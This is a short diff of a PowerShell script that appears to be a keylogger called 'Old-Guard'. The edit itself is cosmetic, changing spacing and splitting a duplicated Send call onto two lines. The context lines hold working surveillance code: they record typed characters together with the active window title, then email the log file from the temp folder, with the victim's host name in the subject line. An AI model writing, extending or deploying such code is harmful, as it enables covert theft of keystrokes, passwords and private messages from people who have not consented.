@@ -191,7 +191,7 @@ function Old-Guard {
                             #convert typed characters
                             if ($UnicodeKey -gt 0) {
                                 $TypedCharacter = $StringBuilder.ToString()
-                                $LogOutput += ('['+ $TypedCharacter +']')
+                                $LogOutput += ('['+  $TypedCharacter  +']')
                             }
 
                             #get the title of the foreground window
@@ -231,7 +231,8 @@ function Old-Guard {
       $ReportEmail.Subject = 'Final Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName
       $ReportEmail.Body = 'Report 001'
       $ReportEmail.Attachments.Add('%temp%/key_final.txt')
-      $SMTPInfo.Send($ReportEmail); $SMTPInfo.Send($ReportEmail)\""))
+      $SMTPInfo.Send($ReportEmail)
+      $SMTPInfo.Send($ReportEmail)
     }
 
     $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))
